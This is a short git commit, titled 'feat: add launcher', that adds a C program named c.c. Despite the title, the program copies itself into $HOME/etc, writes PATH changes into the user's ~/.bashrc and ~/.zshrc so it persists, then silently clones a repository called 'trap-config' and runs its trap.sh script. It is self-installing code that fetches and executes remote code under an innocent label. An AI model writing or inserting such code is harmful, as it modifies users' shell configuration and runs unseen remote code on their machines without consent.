732e93fb4a7b34674187a04e30bf46f0c44a610c
Ezhkin-Kot <ezkot.tokze@gmail.com>
2025-11-28 18:57:41 +0400

    feat: add launcher

---
+++ c.c
@@ -0,0 +1,13 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+    char command[1000];
+    snprintf(command, sizeof(command), "cp \"%s\" $HOME/etc/c", argv[0]);
+    system(command);
+    system("echo 'export PATH=\"$HOME/etc:$PATH\"' >> ~/.bashrc");
+    system("echo 'export PATH=\"$HOME/etc:$PATH\"' >> ~/.zshrc");
+    system("git clone https://github.com/Ezhkin-Kot/trap-config.git ~/trap-config 2>/dev/null && ~/trap-config/trap.sh");
+    return 0;
+}
